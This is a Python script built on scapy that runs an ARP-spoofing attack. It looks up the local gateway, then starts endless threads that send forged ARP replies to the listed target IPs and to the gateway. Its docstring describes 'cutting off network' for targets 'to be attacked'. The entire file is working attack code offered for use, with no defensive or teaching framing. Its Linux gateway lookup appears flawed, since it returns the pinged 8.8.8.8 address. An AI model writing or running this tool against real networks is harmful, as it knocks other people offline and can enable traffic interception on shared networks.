import re
import subprocess
import platform
import threading
from scapy.layers.l2 import ARP, Ether
from scapy.sendrecv import send, srp


def _get_gateway_ip():
    if platform.system() == 'Linux':
        out = subprocess.check_output(['ping', '-c', '1', '8.8.8.8'])

        res = out.split(b'\n')[0].split(b' ')[2].decode('UTF-8')

        return res
    elif platform.system() == 'Windows':
        out = subprocess.check_output(['ipconfig']).decode('latin-1')

        match = re.search(r'Default Gateway[^:]+: (\d+\.\d+\.\d+\.\d+)', out)

        res = match.group(1)
        return res
    else:
        raise NotImplementedError('Can\'t get gateway address. Probably because your OS is not supported')


gateway = _get_gateway_ip()


def _get_mac(ip: str) -> str | None:

    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip, hwdst="ff:ff:ff:ff:ff:ff")

    result = srp(arp_request, timeout=3, verbose=False)[0]
    print(result)
    mac_address = result[0][1].hwsrc if result else None

    return mac_address


def _send_pkt(target: str, spoof: str) -> None:
    packet = ARP(op=2, pdst=target, psrc=spoof, hwdst="ff:ff:ff:ff:ff:ff")
    send(packet, verbose=False)


def _spoof(target: str):
    while True:
        try:
            _send_pkt(target, gateway)
            _send_pkt(gateway, target)
        except Exception as e:
            print(f'Encountered error: {e}')
            raise e


def start_cutting_networks(targets: list[str]) -> None:
    """
    Starts cutting off network for given IP-addresses
    :param targets: list of IP-addresses to be attacked
    """
    for target in targets:
        threading.Thread(target=_spoof, args=[target], daemon=True).start()
